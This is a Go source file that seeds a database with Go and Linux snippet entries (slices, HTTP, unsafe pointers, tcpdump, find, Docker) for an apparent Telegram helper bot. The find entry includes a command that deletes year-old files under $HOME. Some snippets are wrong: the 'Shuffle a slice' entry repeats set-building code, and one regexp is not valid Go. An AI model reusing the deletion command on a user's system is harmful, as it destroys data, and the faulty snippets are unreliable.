package golang

import (
	"gorm.io/gorm"
	"tbot/internal/errors"
)

func initialize(db *gorm.DB) {
	err := db.AutoMigrate(&Topic{}, &Tag{})
	//err := db.Debug().AutoMigrate(&Topic{}, &Tag{})
	errors.PanicIfErr(err)

	create(db, "Get executable dir\n(tags: executable dir)\n---\n\nex, err := os.Executable()\ndir := filepath.Dir(ex)\nfmt.Println(\"dir:\", dir)\n")
	create(db, "Extract beginning of string (prefix)\n(tags: extract beginning string prefix)\n---\n\nt := string([]rune(s)[:5])")
	create(db, "Extract string suffix\n(tags: extract string suffix)\n---\n\nt := string([]rune(s)[len([]rune(s))-5:])")
	create(db, "Exec other program\n(tags: exec program)\n---\n\nerr := exec.Command(\"program\", \"arg1\", \"arg2\").Run()")
	create(db, "Telegram message markdown\n(tags: telegram message markdown)\n---\n\n*полужирный*\n_курсив_\n[ссылка](http://www.example.com/)\n`строчный моноширинный`\n```text\nблочный моноширинный (можно писать код)\n```\n\nimport \"github.com/go-telegram-bot-api/telegram-bot-api\"\n\nmsg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)\nmsg.ParseMode = \"markdown\" //msg.ParseMode = tgbotapi.ModeMarkdown")
	create(db, "Telegram message html\n(tags: telegram message html)\n---\n\n<b>полужирный</b>, <strong>полужирный</strong>\n<i>курсив</i>\n<a href=\"http://www.example.com/\">ссылка</a>\n<code>строчный моноширинный</code>\n<pre>блочный моноширинный (можно писать код)</pre>\n\nimport \"github.com/go-telegram-bot-api/telegram-bot-api\"\n\nmsg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)\nmsg.ParseMode = \"HTML\" //msg.ParseMode = tgbotapi.ModeHTML")
	create(db, "Iterate over map entries ordered by keys\n(tags: iterate map order key)\n---\n\nkeys := make([]string, 0, len(mymap))\nfor k := range mymap {\n    keys = append(keys, k)\n}\nsort.Strings(keys)\nfor _, k := range keys {\n    x := mymap[k]\n    fmt.Println(\"Key =\", k, \", Value =\", x)\n}\n")
	create(db, "Iterate over map entries ordered by values\n(tags: iterate map order value)\n---\n\ntype entry struct {\n    key   string\n    value int\n}\nentries := make([]entry, 0, len(mymap))\nfor k, x := range mymap {\n    entries = append(entries, entry{key: k, value: x})\n}\nsort.Slice(entries, func(i, j int) bool {\n    return entries[i].value < entries[j].value\n})\nfor _, e := range entries {\n    fmt.Println(\"Key =\", e.key, \", Value =\", e.value)\n}")
	create(db, "Slice to set\n(tags: slice set)\n---\n\ny := make(map[T]struct{}, len(x))\nfor _, v := range x {\n    y[v] = struct{}{}\n}")
	create(db, "Deduplicate slice\n(tags: deduplicate slice remove duplicate)\n---\n\nseen := make(map[T]bool)\nj := 0\nfor _, v := range x {\n    if !seen[v] {\n        x[j] = v\n        j++\n        seen[v] = true\n    }\n}\nfor i := j; i < len(x); i++ {\n    x[i] = nil\n}\nx = x[:j]")
	create(db, "Shuffle a slice\n(tags: slice shuffle)\n---\n\ny := make(map[T]struct{}, len(x))\nfor _, v := range x {\n    y[v] = struct{}{}\n}")
	create(db, "Sort slice asc\n(tags: sort slice asc)\n---\n\nsort.Slice(items, func(i, j int) bool {\n    return items[i].p < items[j].p\n})")
	create(db, "Sort slice desc\n(tags: sort slice desc)\n---\n\nsort.Slice(items, func(i, j int) bool {\n    return items[i].p > items[j].p\n})")
	create(db, "Remove item from slice by index\n(tags: remove item slice index)\n---\n\nitems = append(items[:i], items[i+1:]...)")
	create(db, "Graph with adjacency lists\n(tags: graph struct)\n---\n\ntype Vertex struct{\n    Id int\n    Label string\n    Neighbours map[*Vertex]bool\n}\ntype Graph []*Vertex")
	create(db, "Reverse a string\n(tags: string reverse)\n---\n\nrunes := []rune(s)\nfor i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {\n   runes[i], runes[j] = runes[j], runes[i]\n}\nt := string(runes)")
	create(db, "Insert item in slice\n(tags: insert item slice)\n---\n\ns = append(s, 0)\ncopy(s[i+1:], s[i:])\ns[i] = x")
	create(db, "Filter slice\n(tags: filter slice)\n---\n\ny := make([]T, 0, len(x))\nfor _, v := range x{\n    if p(v){\n        y = append(y, v)\n    }\n}")
	create(db, "File content to string\n(tags: file content string)\n---\n\nb, err := ioutil.ReadFile(f)\nlines := string(b)")
	create(db, "Write to std error\n(tags: write std error)\n---\n\nfmt.Fprintln(os.Stderr, x, \"is negative\")")
	create(db, "Big int\n(tags: big integer)\n---\n\nx := new(big.Int)\nx.Exp(big.NewInt(3), big.NewInt(247), nil)")
	create(db, "Round float to int\n(tags: round float int)\n---\n\ny := int(math.Floor(x + 0.5))")
	create(db, "Check if int addition will overflow\n(tags: check int add overflow)\n---\n\nfunc willAddOverflow(a, b int64) bool {\n    return a > math.MaxInt64 - b\n}")
	create(db, "Check if int multiplication will overflow\n(tags: check int multiply overflow)\n---\n\nfunc multiplyWillOverflow(x, y uint64) bool {\n   if x <= 1 || y <= 1 {\n     return false\n   }\n   d := x * y\n   return d/y != x\n}")
	create(db, "Load json file into struct\n(tags: load json file struct)\n---\n\nbuffer, err := ioutil.ReadFile(\"data.json\")\nerr = json.Unmarshal(buffer, &x)")
	create(db, "Load yaml file into struct\n(tags: load yaml file struct)\n---\n\nimport \"gopkg.in/yaml.v3\"\n\nbuffer, err := ioutil.ReadFile(\"data.yaml\")\nerr = yaml.Unmarshal(buffer, &x)")
	create(db, "Save struct into json file\n(tags: save struct json file)\n---\n\nbuffer, err := json.MarshalIndent(x, \"\", \"  \")\nerr = ioutil.WriteFile(\"data.json\", buffer, 0644)")
	create(db, "Print type of variable\n(tags: print type variable)\n---\n\nfmt.Printf(\"%T\", x) //fmt.Println(reflect.TypeOf(x))")
	create(db, "Load from HTTP GET request into a string\n(tags: load http get string)\n---\n\nres, err := http.Get(u)\nbuffer, err := ioutil.ReadAll(res.Body)\nres.Body.Close()\ns := string(buffer)")
	create(db, "Read int from stdin\n(tags: read int std in)\n---\n\n_, err := fmt.Scan(&n)")
	create(db, "UDP listen and read\n(tags: udp listen read)\n---\n\nServerAddr,err := net.ResolveUDPAddr(\"udp\",p)\nServerConn, err := net.ListenUDP(\"udp\", ServerAddr)\ndefer ServerConn.Close()\nn,addr,err := ServerConn.ReadFromUDP(b[:1024])\nif n<1024 {\n    return fmt.Errorf(\"Only %d bytes could be read.\", n)\n}")
	create(db, "Binary search in sorted slice\n(tags: binary search slice)\n---\n\nfunc binarySearch(a []T, x T) int {\n    imin, imax := 0, len(a)-1\n    for imin <= imax {\n        imid := (imin + imax) / 2\n        switch {\n        case a[imid] == x:\n        return imid\n        case a[imid] < x:\n        imin = imid + 1\n        default:\n        imax = imid - 1\n        }\n    }\n    return -1\n}")
	create(db, "Measure func call duration\n(tags: measure func call duration time)\n---\n\nt1 := time.Now()\nfoo()\nt := time.Since(t1)\nns := t.Nanoseconds()\nfmt.Printf(\"%dns\\n\", ns)\n\nor \n\nfunc Duration(invocation time.Time, name string) {\n  elapsed := time.Since(invocation)\n  log.Printf(\"%s lasted %s\", name, elapsed)\n}\nfunc BigIntFactorial(x big.Int) *big.Int {\n  defer profile.Duration(time.Now(), \"IntFactorial\")\n\n  y := big.NewInt(1)\n  for one := big.NewInt(1); x.Sign() > 0; x.Sub(x, one) {\n    y.Mul(y, x)\n  }\n  return x.Set(y)\n}")
	create(db, "Breadth-first traversing in a graph\n(tags: bfs traversing graph)\n---\n\nfunc (start *Vertex) Bfs(f func(*Vertex)) {\n    queue := []*Vertex{start}\n    seen := map[*Vertex]bool{start: true}\n    for len(queue) > 0 {\n        v := queue[0]\n        queue = queue[1:]\n        f(v)\n        for next, isEdge := range v.Neighbours {\n            if isEdge && !seen[next] {\n                queue = append(queue, next)\n                seen[next] = true\n            }\n        }\n    }\n}")
	create(db, "Depth-first traversing in a graph\n(tags: dfs traversing graph)\n---\n\nfunc (v *Vertex) Dfs(f func(*Vertex), seen map[*Vertex]bool) {\n    seen[v] = true\n    f(v)\n    for next, isEdge := range v.Neighbours {\n        if isEdge && !seen[next] {\n            next.Dfs(f, seen)\n        }\n    }\n}")
	create(db, "Check if string contains only digits\n(tags: check string contains only digits)\n---\n\nisNotDigit := func(c rune) bool { return c < '0' || c > '9' }\nb := strings.IndexFunc(s, isNotDigit) == -1")
	create(db, "Check if file exists\n(tags: check file exist)\n---\n\n_, err := os.Stat(fp)\nb := !os.IsNotExist(err)")
	create(db, "Read slice of int from stdin\n(tags: read slice int std in)\n---\n\nvar ints []int\ns := bufio.NewScanner(os.Stdin)\nfor s.Scan() {\n    i, err := strconv.Atoi(s.Text())\n    if err == nil {\n        ints = append(ints, i)\n    }\n}")
	create(db, "Detect if 32-bit or 64-bit architecture\n(tags: detect 32 64 architecture)\n---\n\nif strconv.IntSize==32 {\n    f32()\n}\nif strconv.IntSize==64 {\n    f64()\n}")
	create(db, "Parse flags\n(tags: parse flags args)\n---\n\nvar b = flag.Bool(\"b\", false, \"Do bat\")\nfunc main() {\n    flag.Parse()\n    if *b {\n        bar()\n    }\n}")
	create(db, "Open URL in default browser\n(tags: open url default browser)\n---\n\nfunc openbrowser(url string) {\n    var err error\n    switch runtime.GOOS {\n    case \"linux\":\n        err = exec.Command(\"xdg-open\", url).Start()\n    case \"windows\":\n        err = exec.Command(\"rundll32\", \"url.dll,FileProtocolHandler\", url).Start()\n    case \"darwin\":\n        err = exec.Command(\"open\", url).Start()\n    default:\n        err = fmt.Errorf(\"unsupported platform\")\n    }\n    if err != nil {\n        log.Fatal(err)\n    }\n}")
	create(db, "Concatenate two slices\n(tags: concat two slice)\n---\n\nab := append(a, b...)")
	create(db, "String length\n(tags: string length)\n---\n\nn := utf8.RuneCountInString(s)")
	create(db, "Make HTTP POST request\n(tags: make http post request)\n---\n\nresponse, err := http.Post(u, contentType, body)")
	create(db, "Bytes to hex string\n(tags: byte hex string)\n---\n\ns := hex.EncodeToString(a)")
	create(db, "Hex string to byte array\n(tags: byte hex string)\n---\n\na, err := hex.DecodeString(s)")
	create(db, "Find files with a given list of filename extensions\n(tags: file extension walk)\n---\n\nL := []string{}\nerr := filepath.Walk(D, func(path string, info os.FileInfo, err error) error {\n    if err != nil {\n        fmt.Printf(\"failure accessing a path %q: %v\\n\", path, err)\n        return err\n    }\n    for _, ext := range []string{\".jpg\", \".jpeg\", \".png\"} {\n        if strings.HasSuffix(path, ext) {\n            L = append(L, path)\n            break\n        }\n    }\n    return nil\n})\n")
	create(db, "Check if point is inside rectangle\n(tags: check point inside rect)\n---\n\np := image.Pt(x, y)\nr := image.Rect(x1, y1, x2, y2)\nb := p.In(r)")
	create(db, "List files in directory\n(tags: list file dir)\n---\n\nx, err := ioutil.ReadDir(d)")
	create(db, "Make HTTP PUT request\n(tags: make http put request)\n---\n\nreq, err := http.NewRequest(\"PUT\", u, body)\nreq.Header.Set(\"Content-Type\", contentType)\nreq.ContentLength = contentLength\nresponse, err := http.DefaultClient.Do(req)")
	create(db, "Execute function in 30 seconds\n(tags: exec func after time)\n---\n\ntimer := time.AfterFunc(\n    30*time.Second,\n    func() {\n        f(42)\n    })")
	create(db, "Matrix multiplication\n(tags: matrix multiply)\n---\n\nc := new(mat.Dense)\nc.Mul(a, b)")
	create(db, "Filter and transform slice\n(tags: filter transform slice)\n---\n\nvar y []Result\nfor _, e := range x {\n    if P(e) {\n        y = append(y, T(e))\n    }\n}")
	create(db, "Get an environment variable\n(tags: env var)\n---\n\nfoo, ok := os.LookupEnv(\"FOO\")\nif !ok {\n    foo = \"none\"\n}")
	create(db, "Create folder\n(tags: create folder dir)\n---\n\nerr := os.MkdirAll(path, os.ModeDir)")
	create(db, "Pad string on the right\n(tags: pad string right)\n---\n\nif n := utf8.RuneCountInString(s); n < m {\n    s += strings.Repeat(c, m-n)\n}")
	create(db, "Pad string on the left\n(tags: pad string left)\n---\n\nif n := utf8.RuneCountInString(s); n < m {\n    s = strings.Repeat(c, m-n) + s\n}")
	create(db, "Progress bar\n(tags: progress bar)\n---\n\nfunc printProgressBar(n int, total int) {\n    var bar []string\n    tantPerFourty := int((float64(n) / float64(total)) * 40)\n    tantPerCent := int((float64(n) / float64(total)) * 100)\n    for i := 0; i < tantPerFourty; i++ {\n        bar = append(bar, \"█\")\n    }\n    progressBar := strings.Join(bar, \"\")\n    fmt.Printf(\"\\r \" + progressBar + \" - \" + strconv.Itoa(tantPerCent) + \"\")\n}")
	create(db, "Create a zip archive\n(tags: create zip archive)\n---\n\nbuf := new(bytes.Buffer)\nw := zip.NewWriter(buf)\nfor _, filename := range list {\n    input, err := os.Open(filename)\n    output, err := w.Create(filename)\n    _, err = io.Copy(output, input)\n}\nerr := w.Close()\nerr = ioutil.WriteFile(name, buf.Bytes(), 0777)")
	create(db, "Slice intersection\n(tags: slice intersection)\n---\n\nseta := make(map[T]bool, len(a))\nfor _, x := range a {\n    seta[x] = true\n}\nsetb := make(map[T]bool, len(a))\nfor _, y := range b {\n    setb[y] = true\n}\n\nvar c []T\nfor x := range seta {\n    if setb[x] {\n        c = append(c, x)\n    }\n}")
	create(db, "Replace multiple spaces with single space\n(tags: replace space)\n---\n\nwhitespaces := regexp.MustCompile('\\s+')\nt := whitespaces.ReplaceAllString(s, \" \")")
	create(db, "Create a tuple value\n(tags: create tuple interface)\n---\n\nt := []interface{}{\n    2.5,\n    \"hello\",\n    make(chan int),\n}")
	create(db, "Remove all non-digits chars\n(tags: remove digit char)\n---\n\nre := regexp.MustCompile(\"[^\\\\d]\")\nt := re.ReplaceAllLiteralString(s, \"\")")
	create(db, "Add element to the beginning of the slice\n(tags: add beginning slice)\n---\n\nitems = append([]T{x}, items...)")
	create(db, "Copy slice\n(tags: copy slice)\n---\n\ny := make([]T, len(x))\ncopy(y, x)")
	create(db, "Copy file\n(tags: copy file)\n---\n\nfunc copy(dst, src string) error {\n    data, err := ioutil.ReadFile(src)\n    stat, err := os.Stat(src)\n    return ioutil.WriteFile(dst, data, stat.Mode())\n}")
	create(db, "Cancel an operation\n(tags: cancel operation func)\n---\n\nctx, cancel := context.WithCancel(context.Background())\ngo p(ctx)\nsomethingElse()\ncancel()")
	create(db, "Timeout\n(tags: timeout operation func)\n---\n\nctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)\ndefer cancel()\np(ctx)")
	create(db, "Check if bytes are a valid UTF-8 string\n(tags: check byte valid utf8)\n---\n\nb := utf8.Valid(s)")
	create(db, "Encode bytes to base64\n(tags: encode byte base64)\n---\n\ns := base64.StdEncoding.EncodeToString(data)")
	create(db, "Decode base64\n(tags: decode string base64)\n---\n\ndata, err := base64.StdEncoding.DecodeString(s)")
	create(db, "Set value on field of structure in map\n(tags: set value field struct map)\n---\n\ntemp := m[key]\ntemp.SomeField = 42\nm[key] = temp")
	create(db, "Deploy on Heroku\n(tags: heroku deploy)\n---\n\nCheck this:\n1. On site heroku/<myappname>/recources web toggle button turn on\n2. In code http.ListenAndServe(\":\" + os.Getenv(\"PORT\"), nil)\n3. In root app's dir you have \"Procfile\" with \"web: bin/myapp\"\n4. File go.mod have \"// +heroku goVersion go1.15\" above the line \"go 1.15\"")
	create(db, "HTTP file server\n(tags: http file server)\n---\n\nhttp.Handle(\"/\", http.FileServer(http.Dir(\".\")))\nhttp.ListenAndServe(\":80\", nil)\n// log.Fatal(http.ListenAndServe(\":8080\", http.FileServer(http.Dir(\"/usr/share/doc\"))))")
	create(db, "Update major version of package in go.mod\n(tags: update major version package mod)\n---\n\n// go mod init myapp\n// go mod vendor\nadd version on import github.com/go-telegram-bot-api/telegram-bot-api/v5 \nor if you want to use the newest commit\ngo get github.com/go-telegram-bot-api/telegram-bot-api@b6df6c2\ngo mod tidy")
	create(db, "Using go mod vendor\n(tags: mod vendor)\n---\n\ngo mod init myapp\ngo mod vendor\ngo build -mod=vendor main.go")
	create(db, "Linux tcpdump\n(tags: linux tcpdump)\n---\n\n// output format\n[Timestamp] [Protocol] [Src IP].[Src Port] > [Dst IP].[Dst Port]: [Flags], [Seq], [Ack], [Win Size], [Options], [Data Length]\n// show available interfaces\ntcpdump -D\n// catch all packets\ntcpdump -i any\n// catch first 5 packets\ntcpdump -i any -c 5\n// do not resolve ip (-n) and ports (-nn)\ntcpdump -i any -c5 -nn\n// filter by icmp packets\ntcpdump -i any -c5 icmp\n// filter packets by a special host\ntcpdump -i any -c5 -nn host 54.204.39.132\n// filer packets by subnet\ntcpdump -n net 192.168.1\n// filter by port\ntcpdump -i any -c5 -nn port 80\n// filter by ports\ntcpdump -n portrange 11128-11142\n// filter by destination \ntcpdump -i any -c5 -nn dst 192.168.122.98\n// complexly\ntcpdump -i any -c5 -nn src 192.168.122.98 and port 80\ntcpdump -i any -c5 -nn \"port 80 and (src 192.168.122.98 or src 54.204.39.132)\"\n// print packet content in ascii (-A) or hex (-X)\ntcpdump -i any -c10 -nn -A port 80\n// save result in file\ntcpdump -i any -c10 -nn -w webserver.pcap port 80\n// read result from file (you may use wireshark)\ntcpdump -nn -r webserver.pcap\ntcpdump -nn -r webserver.pcap src 54.204.39.132")
	create(db, "Linux info\n(tags: linux info)\n---\n\nid      // info about your account\nw       // who there are in the system now\nlscpu   // info about processors\nlsof    // list of open files\nfree    // info about memory\ncat     // show content of the file\nless    // show file in fragments\nmore    // for big files\ntail -f // show end of file in interactive\ncmp     // compare files by bytes\ncomm    // show sort files string by string\ndiff    // show diff between files\ngrep    // find in text by regexp \nfind    // find files\nwc      // words count")
	create(db, "Linux bash hotkeys\n(tags: linux bash hotkeys)\n---\n\nalt+b  // move cursor to the start of word (back)\nalt+f  // move to the end of word (forward)\nctrl+a // move to the start\nctrl+e // move to the end\nctrl+]<char> // move right to first <char> entry\nctrl+alt+]<char> // move left to <char>\nctrl+w // remove word before the cursor\nalt+d  // remove word after\nctrl+u // remove all before cursor\nctrl+k // remove all after cursor\nctrl+y // return removed \n!! // repeat last command\n!$ // \"cat a.txt\" then \"less !$\" = \"less a.txt\"\n!* // \"head a.txt | grep '^Al'\" then \"tail !*\"\nalt+. // insert last arg from previous command\nalt+<N>+alt+. // insert <N> arg from previous command\n>a.txt // creat file or clean it\nctrl+l // clean terminal\nctrl+r // show history\nctrl+d // exit")
	create(db, "Linux std\n(tags: linux std in out err)\n---\n\n> send to stream\n< get from straem\n>> append to stream\n<< join stream\n// send stdout to out.txt, stderr to err.txt\n./myapp > out.txt 2> err.txt\n// send stdout and stderr in outerr.txt\n./myapp > outerr.txt 2>&1 ac -pd &> outerr.txt\n// skip stdout and stderr\n./myapp &> /dev/null\n// stdout as arg\ndiff <(ls dirA) <(ls dirB)\n// create files with names from list\nxargs touch < list.txt")
	create(db, "Linux find\n(tags: linux find)\n---\n\nfind /opt -name \"README*\" -exec wc -l {} +\n// criteria:\n-name,  -iname, -type (f, d, l), -inum <Н>, -not-name\n-user<uname>, -group<gname>,  -perm (ugo+/-rwx)\n-size +x[c], -empty, -newer <fname>\n-atime +x, -amin +x, -mmin -x, -mtime -x\n-and (-a), or (-o)\n-~ (hiden files), -perm (permissions)\n// actions:\n-print — default print\n-ls — exec ls -lids for every result file\n-exec cmd — exec command\n-ok cmd — exec command after user confirmation\n// examples:\nfind . -type f -iname \"*.txt\" — xt-files in curdir\nfind . -maxdepth 1 — equivalent ls\nfind ./somedir -type f -size +512M -print — all files large then 512M in ./somedir\nfind /usr/bin ! -type l — no symbol link in /usr/bin\nfind $HOME -type f -atime +365 -exec rm {} + — remove all files that have not been available for a year\nfind . \\( -name \"*.c\" -o -name \"*.h\" \\) — all files with .c or .h extention")
	create(db, "Linux grep\n(tags: linux grep)\n---\n\ngrep -i -n 'c.l' states.txt\n// print number of string whoes start with t\nprintf \"one\\ntwo\\nthree\\nfour\\nfive\" | grep -n '^t'\n  2:two\n  3:three\n// options:\n-i: ignore case\n-n: print string number with strings\n-v: invert - print that not matched\n-c: print count of matched strings\n-A<n>: print <n> strings after\n-B<n>: print <n> strings before\n-o: print only matched, not whole string\n-E: allowed to use extention regexp\n-r: recurcive in dirs\n-w: find word\n-l: print with file names\n--color: colorise print")
	create(db, "Linux awk\n(tags: linux awk)\n---\n\n// $0 - all string, $1 - first word, $2 - second...\necho \"I'm Tom\" | awk '{$2=\"Bill\"; print $0}' \n  I'm Bill\nprintf \"12\\n32\\n54\\n6\" | awk '{if ($1>20) print $1}'\n  32\n  54 \n// use function  \nprintf \"first a\\nsecond b\\nthird c\" | awk '{print(toupper($1))}' >&1\n  FIRST\n  SECOND\n  THIRD\n// set other word delimeter\nprintf \"first:a\\nsecond:b\\nthird:c\" | awk 'BEGIN{FS=\":\"}{print(toupper($1))}' >&1\nprintf \"first:a\\nsecond:b\\nthird:c\" | awk -F: '{print(toupper($1))}' >&1\n  FIRST\n  SECOND\n  THIRD\n// print last field\nprintf \"a b c d e f\" | awk '{print(toupper($NF))}' >&1\n  f\n// set other string delimeter and use filter\nprintf \"1a 1b 2c 2d 3e 3f\" | awk 'BEGIN{RS=\" \"}{print(toupper($NF))}' | awk '/2/{print $0}'\n  2C\n  2D\n// use variables\necho -e 'one 1\\n two 2' | awk '{sum+=$2}END{print sum}'\n  3\n// sum of values in last column in file\n< requests.log awk '{totalBytes+=$NF}END{print totalBytes}'\n// substr function (printf(string), system(command), length(string))\nprintf \"1a 1b\" | awk 'BEGIN{RS=\" \"}{print(substr($1,2,1))}'\n  a\n  b")
	create(db, "Linux sed\n(tags: linux sed)\n---\n\n// print 2-4 strings from file, show only result (-n)\nprintf \"one\\ntwo\\nthree\\nfour\\nfive\" | sed -n '2,4p'\n  two\n  three\n  four\n// print without 1-2 strings\nprintf \"one\\ntwo\\nthree\\nfour\\nfive\" | sed '1,2d'\n  three\n  four\n  five\n// replace words\nprintf \"one\\ntwo\\nthree\" | sed 's/tw/TW/g'\n  one\n  TWo\n  three\n// replace chars\nprintf \"one\\ntwo\\nthree\" | sed 'y/t/T/'\n  one\n  Two\n  Three\n// append string\n  printf \"one\\ntwo\" | sed 'a-----'\n  one\n  -----\n  two\n  -----")
	create(db, "Compile for android\n(tags: compile android)\n---\n\nenv GOOS=android GOARCH=arm64 go build main.go")
	create(db, "Cli tool\n(tags: cli tool)\n---\n\nimport \"github.com/urfave/cli/v2\"\n\nfunc main() {\n  var language string\n  app := &cli.App{\n    Flags: []cli.Flag {\n      &cli.StringFlag{\n        Name:        \"lang\",\n\t\tAliases:     []string{\"l\"},\n        Value:       \"english\",\n        Usage:       \"language for the greeting\",\n        Destination: &language,\n      },\n    },\n    Action: func(c *cli.Context) error {\n      name := \"someone\"\n      if c.NArg() > 0 {\n        name = c.Args().Get(0)\n      }\n      if language == \"spanish\" {\n        fmt.Println(\"Hola\", name)\n      } else {\n        fmt.Println(\"Hello\", name)\n      }\n      return nil\n    },\n  }\n  err := app.Run(os.Args)\n  if err != nil {\n    log.Fatal(err)\n  }\n}")
	create(db, "Linux tree\n(tags: linux tree)\n---\n\n// print only dir with low than 26 files\ntree -d --filelimit 26\n// print hiden dir, sort by depth, show modify date\ntree -avD\n// print files that matched template, do not show dir that gave not needed files\ntree -P '*.pdf' --prune\n// write three with dir into a file\ntree -d -o tree_command_results.txt\n// print size, user, permissions, full path\ntree -hupf")
	create(db, "Build go app in docker from scratch\n(tags: docker build scratch)\n---\n\nFROM golang AS builder\nADD . /app\nWORKDIR /app\nRUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags \"-static\"' -o kit\n\nFROM scratch\nCOPY --from=builder /app/kit /app/kit\nEXPOSE 8080 8080\nENTRYPOINT [\"/app/kit\"]")
	create(db, "Use prometheus and grafana\n(tags: docker prometheus grafana compose)\n---\n\n// Dockerfile\nFROM golang AS builder\nADD . /app\nWORKDIR /app\nRUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags \"-static\"' -o kit\n\nFROM scratch\nCOPY --from=builder /app/kit /app/kit\nEXPOSE 8080 8080\nENTRYPOINT [\"/app/kit\"]\n\n// prometheus/prometheus.yml\nscrape_configs:\n  - job_name: my_group\n    scrape_interval: 10s\n    static_configs:\n      - targets:\n          - kit:8080\n\t\t  \n// docker-compose.yaml\nversion: \"3\"\n\nservices:\n  kit:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    ports:\n      - 8080:8080\n\n  grafana:\n    image: grafana/grafana\n    container_name: grafana\n    ports:\n      - 3000:3000\n\n  prometheus:\n    image: prom/prometheus\n    container_name: prometheus\n#    restart: unless-stopped\n    ports:\n      - 9090:9090\n    volumes:\n      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml\n\n// docker-compose up")
	create(db, "Simple metrics for prometheus\n(tags: metrics prometheus)\n---\n\nimport (\n  \"github.com/prometheus/client_golang/prometheus\"\n  \"github.com/prometheus/client_golang/prometheus/promauto\"\n  \"github.com/prometheus/client_golang/prometheus/promhttp\"\n)\n\nfunc recordMetrics() {\n  go func() {\n    for {\n      opsProcessed.Inc()\n      time.Sleep(2 * time.Second)\n    }\n  }()\n}\n\nvar opsProcessed = promauto.NewCounter(prometheus.CounterOpts{\n    Name: \"myapp_processed_ops_total\",\n    Help: \"The total number of processed events\",\n  })\n\nfunc main() {\n  recordMetrics()\n  http.Handle(\"/metrics\", promhttp.Handler())\n  http.ListenAndServe(\":8080\", nil)\n}\n// curl http://localhost:8080/metrics")
	create(db, "Install golang on android\n(tags: install android)\n---\n\n1. Install Termux from Play Market\n2. pkg install golang \n3. cd ~\n4. mkdir gopath\n5. export GOPATH=$HOME/gopath\n6. pkg install git\n7. go get github.com/gorilla/mux")
	create(db, "Unsafe for loop\n(tags: unsafe for loop)\n---\n\narr := []uint32{1, 2, 3}\nconst size = unsafe.Sizeof(uint32(0)) //4\nfor i := 0; i < len(arr); i++ {\n  fmt.Printf(\"%d \",\n    *(*uint32)( // conver into (*uint32), then take value - *(*uint32)\n      unsafe.Pointer( // get address\n        // address 0-element + offset size (4)\n        uintptr(unsafe.Pointer(&arr[0])) + (uintptr(i) * size)))) // uintptr(i) for type assign\n}")
	create(db, "Unsafe string to bytes without copy\n(tags: unsafe string byte)\n---\n\nfunc string2bytes(s string) []byte {\n  stringHeader := (*reflect.StringHeader)(unsafe.Pointer(&s))\n  bh := reflect.SliceHeader{\n    Data: stringHeader.Data,\n    Len:  stringHeader.Len,\n    Cap:  stringHeader.Len,\n  }\n  return *(*[]byte)(unsafe.Pointer(&bh))\n}")
	create(db, "Unsafe bytes to string without copy\n(tags: unsafe string byte)\n---\n\nfunc bytes2string(b []byte) string {\n  sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&b))\n  sh := reflect.StringHeader{\n    Data: sliceHeader.Data,\n    Len:  sliceHeader.Len,\n  }\n  return *(*string)(unsafe.Pointer(&sh))\n}")
	create(db, "Unsafe change struct fields\n(tags: unsafe struct field)\n---\n\ntype Programmer struct {\n  name     string\n  language string\n}\np := Programmer{\"Tom\", \"en\"}\nname := (*string)(unsafe.Pointer(&p))\n*name = \"Foma\"\nlang := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p)) + unsafe.Offsetof(p.language)))\n*lang = \"ru\"")
	create(db, "Unsafe change unexported struct fields from other package\n(tags: unsafe struct field unexported)\n---\n\np2 := a.Programmer2{}\n// cannot refer to unexported field or method name (p2.name = \"Foma\")\n// but we can see in source code what the fields there. First field is string\nname2 := (*string)(unsafe.Pointer(&p2))\n*name2 = \"Foma\"\n// second field is int. Doing the offset by string size\nage2 := (*int)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string(\"\"))))\n*age2 = 25\n// third field is string\nlang2 := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string(\"\")) + unsafe.Sizeof(int(0))))\n*lang2 = \"ru\"")
	create(db, "Json marshal infinity float to null\n(tags: json marshal float nan infinity)\n---\n\ntype Measure struct {\n  Type  string   `json:\"type\"`\n  Power *float64 `json:\"power\"`\n}\n\nfunc main() {\n  val := math.Inf(1)\n  power := &val\n  if math.IsInf(val, 0) {\n  \tpower = nil\n  }\n  m := Measure{\n  \tType: \"simple\",\n  \tPower: power,\n  }\n  j, _ := json.Marshal(&m)\n  fmt.Println(string(j)) // {\"type\":\"simple\",\"power\":null}\n}")
	create(db, "Scan arguments in string by template\n(tags: scan arg string)\n---\n\nvar name string\nvar age int\nn, err := fmt.Sscanf(\"Joe is 22 years old\", \"%s is %d years old\", &name, &age)")
	create(db, "Printf formats\n(tags: printf print format)\n---\n\nvar i int\nvar f float32\nvar s string\nvar b bool\nvar c Car\n\nfmt.Printf(\"%v\\n\", i) //0\nfmt.Printf(\"%v\\n\", f) //0\nfmt.Printf(\"%v\\n\", s) //\nfmt.Printf(\"%v\\n\", b) //false\nfmt.Printf(\"%v\\n\", c) //{ 0}\n\nfmt.Printf(\"%+v\\n\", i) //0\nfmt.Printf(\"%+v\\n\", f) //0\nfmt.Printf(\"%+v\\n\", s) //\nfmt.Printf(\"%+v\\n\", b) //false\nfmt.Printf(\"%+v\\n\", c) //{Model: Speed:0}\n\nfmt.Printf(\"%#v\\n\", i) //0\nfmt.Printf(\"%#v\\n\", f) //0\nfmt.Printf(\"%#v\\n\", s) //\"\"\nfmt.Printf(\"%#v\\n\", b) //false\nfmt.Printf(\"%#v\\n\", c) //main.Car{Model:\"\", Speed:0}\n\nfmt.Printf(\"%T\\n\", i) //int\nfmt.Printf(\"%T\\n\", f) //float32\nfmt.Printf(\"%T\\n\", s) //string\nfmt.Printf(\"%T\\n\", b) //bool\nfmt.Printf(\"%T\\n\", c) //main.Car\n\nfmt.Printf(\"%%\\n\") //%\n\ni = 15\nf = 32.7\ns = \"Pri vet!\"\nb = true\nc = Car{\"Audi\", 200}\n\nfmt.Printf(\"%#v\\n\", i) //15\nfmt.Printf(\"%#v\\n\", f) //32.7\nfmt.Printf(\"%#v\\n\", s) //\"Pri 